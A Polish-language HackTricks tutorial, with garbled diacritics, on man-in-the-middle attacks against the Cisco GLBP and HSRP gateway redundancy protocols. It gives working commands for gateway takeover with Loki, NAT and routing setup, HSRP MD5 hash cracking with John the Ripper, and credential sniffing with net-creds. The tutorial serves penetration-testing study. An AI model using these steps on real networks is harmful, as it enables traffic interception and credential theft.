# Ataki GLBP i HSRP

<details>

<summary><strong>Zacznij od zera i sta si ekspertem od hakowania AWS dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) albo **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Przegld Przechwytywania FHRP

### Wgld w FHRP
FHRP zosta zaprojektowany w celu zapewnienia odpornoci sieci poprzez poczenie wielu router贸w w jednostk wirtualn, co zwiksza rozkad obci偶enia i tolerancj na awarie. Cisco Systems wprowadzi znaczce protokoy w tej grupie, takie jak GLBP i HSRP.

### Wgld w Protok贸 GLBP
Stworzony przez Cisco, GLBP dziaa na stosie TCP/IP, wykorzystujc UDP na porcie 3222 do komunikacji. Routery w grupie GLBP wymieniaj pakiety "hello" co 3 sekundy. Jeli router nie wysya tych pakiet贸w przez 10 sekund, uznaje si go za offline. Jednak te timery nie s stae i mog by modyfikowane.

### Operacje i Rozkad Obci偶enia w GLBP
GLBP wyr贸偶nia si umo偶liwieniem rozkadu obci偶enia midzy routerami za pomoc jednego wirtualnego IP w poczeniu z wieloma wirtualnymi adresami MAC. W grupie GLBP ka偶dy router bierze udzia w przekazywaniu pakiet贸w. W odr贸偶nieniu od HSRP/VRRP, GLBP oferuje rzeczywiste r贸wnowa偶enie obci偶enia poprzez kilka mechanizm贸w:

- **R贸wnowa偶enie Obci偶enia Zale偶ne od Hosta:** Zapewnia stae przypisanie adresu MAC AVF do hosta, co jest istotne dla stabilnych konfiguracji NAT.
- **R贸wnowa偶enie Obci偶enia Round-Robin:** Domylne podejcie, polegajce na zmianie przypisania adresu MAC AVF midzy 偶dajcymi hostami.
- **R贸wnowa偶enie Obci偶enia Wa偶one Round-Robin:** Rozkada obci偶enie na podstawie zdefiniowanych metryk "Waga".

### Kluczowe Skadniki i Terminologia w GLBP
- **AVG (Aktywna Wirtualna Bramka):** G贸wny router odpowiedzialny za przydzielanie adres贸w MAC do router贸w r贸wnorzdnych.
- **AVF (Aktywny Wirtualny Przekierowujcy):** Router wyznaczony do zarzdzania ruchem sieciowym.
- **Priorytet GLBP:** Metryka okrelajca AVG, zaczynajca si od domylnej wartoci 100 i w zakresie od 1 do 255.
- **Waga GLBP:** Odzwierciedla obecne obci偶enie routera, regulowana rcznie lub poprzez ledzenie Obiekt贸w.
- **Wirtualny Adres IP GLBP:** Su偶y jako domylna brama sieciowa dla wszystkich podczonych urzdze.

Do interakcji GLBP u偶ywa zarezerwowanego adresu multicastowego 224.0.0.102 i portu UDP 3222. Routery wysyaj pakiety "hello" co 3 sekundy i uznawane s za nieoperacyjne, jeli pakiet zostanie pominity przez okres 10 sekund.

### Mechanizm Ataku GLBP
Atakujcy mo偶e sta si g贸wnym routerem, wysyajc pakiet GLBP z najwy偶sz wartoci priorytetu (255). Mo偶e to prowadzi do atak贸w typu DoS lub MITM, umo偶liwiajc przechwycenie lub przekierowanie ruchu.

### Wykonanie Ataku GLBP za pomoc Loki
[Loki](https://github.com/raizo62/loki_on_kali) mo偶e przeprowadzi atak GLBP poprzez wstrzyknicie pakietu z ustawionym priorytetem i wag na 255. Kroki przed atakiem obejmuj zbieranie informacji, takich jak wirtualny adres IP, obecno uwierzytelnienia i wartoci priorytetu routera, za pomoc narzdzi takich jak Wireshark.

Kroki Ataku:
1. Przecz si w tryb promiskuitywny i wcz przekazywanie IP.
2. Zidentyfikuj docelowy router i pobierz jego IP.
3. Wygeneruj ARP Gratuitous.
4. Wstrzyknij zoliwy pakiet GLBP, podszywajc si pod AVG.
5. Przypisz drugi adres IP do interfejsu sieciowego atakujcego, odzwierciedlajc wirtualny adres IP GLBP.
6. Wdro偶 SNAT dla penej widocznoci ruchu.
7. Dostosuj trasowanie, aby zapewni cigy dostp do internetu poprzez oryginalny router AVG.

ledzc te kroki, atakujcy umieszcza si jako "czowiek porodku", zdolny do przechwytywania i analizowania ruchu sieciowego, w tym danych niezaszyfrowanych lub wra偶liwych.

Poni偶ej znajduj si wymagane fragmenty polece do demonstracji:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Pasywne wyjanienie przechwytywania HSRP z szczeg贸ami polece

#### Przegld HSRP (Hot Standby Router/Redundancy Protocol)
HSRP to protok贸 wasnociowy firmy Cisco zaprojektowany do zapewnienia redundancji bramy sieciowej. Umo偶liwia konfiguracj wielu fizycznych router贸w w pojedyncz jednostk logiczn z wsp贸lnym adresem IP. Ta jednostka logiczna jest zarzdzana przez g贸wny router odpowiedzialny za kierowanie ruchem. W przeciwiestwie do GLBP, kt贸ry wykorzystuje metryki takie jak priorytet i waga do r贸wnowa偶enia obci偶enia, HSRP polega na pojedynczym aktywnym routerze do zarzdzania ruchem.

#### Role i Terminologia w HSRP
- **Aktywny Router HSRP**: Urzdzenie penice rol bramy, zarzdzajce przepywem ruchu.
- **Rezerwowy Router HSRP**: Router zapasowy, gotowy do przejcia roli aktywnego routera w przypadku awarii.
- **Grupa HSRP**: Zestaw router贸w wsp贸pracujcych w celu utworzenia pojedynczego, odpornego wirtualnego routera.
- **Adres MAC HSRP**: Wirtualny adres MAC przypisany do routera logicznego w konfiguracji HSRP.
- **Wirtualny Adres IP HSRP**: Wirtualny adres IP grupy HSRP, dziaajcy jako domylna brama dla podczonych urzdze.

#### Wersje HSRP
HSRP wystpuje w dw贸ch wersjach, HSRPv1 i HSRPv2, r贸偶nicych si g贸wnie pojemnoci grupy, u偶yciem adres贸w IP multicast oraz struktur wirtualnego adresu MAC. Protok贸 wykorzystuje okrelone adresy IP multicast do wymiany informacji usugowych, z pakietami Hello wysyanymi co 3 sekundy. Router jest uznawany za nieaktywny, jeli nie otrzyma pakietu w cigu 10 sekund.

#### Mechanizm Ataku HSRP
Ataki HSRP polegaj na przymusowym przejciu roli Aktywnego Routera poprzez wstrzyknicie maksymalnej wartoci priorytetu. Mo偶e to prowadzi do ataku typu Man-In-The-Middle (MITM). Istotne kroki przed atakiem obejmuj zbieranie danych na temat konfiguracji HSRP, co mo偶na zrobi za pomoc Wireshark do analizy ruchu.

#### Kroki do obejcia uwierzytelniania HSRP
1. Zapisz ruch sieciowy zawierajcy dane HSRP jako plik .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Wyodrbnij hashe MD5 z pliku .pcap za pomoc hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Odszyfruj hashe MD5 za pomoc John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Wykonanie Wstrzyknicia HSRP za pomoc Loki**

1. Uruchom Loki, aby zidentyfikowa reklamy HSRP.
2. Ustaw interfejs sieciowy w tryb promiskuitywny i wcz przekazywanie IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. U偶yj Lokiego, aby zaatakowa okrelony router, wprowad藕 odszyfrowane haso HSRP i wykonaj niezbdne konfiguracje do podszywania si pod Aktywnego Routera.
4. Po przejciu roli Aktywnego Routera skonfiguruj interfejs sieciowy i tabele IP, aby przechwyci legalny ruch.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Zmodyfikuj tabel routingu, aby kierowa ruch przez poprzedniego Aktywnego Routera.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. U偶yj net-creds.py lub podobnego narzdzia do przechwytywania powiadcze z przechwyconego ruchu.
```shell
sudo python2 net-creds.py -i eth0
```

Wykonanie tych krok贸w umieszcza atakujcego w pozycji do przechwytywania i manipulowania ruchem, podobnie jak w przypadku przejcia GLBP. Podkrela to podatno protoko贸w redundancji, takich jak HSRP, oraz konieczno stosowania solidnych rodk贸w bezpieczestwa.


## Referencje
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
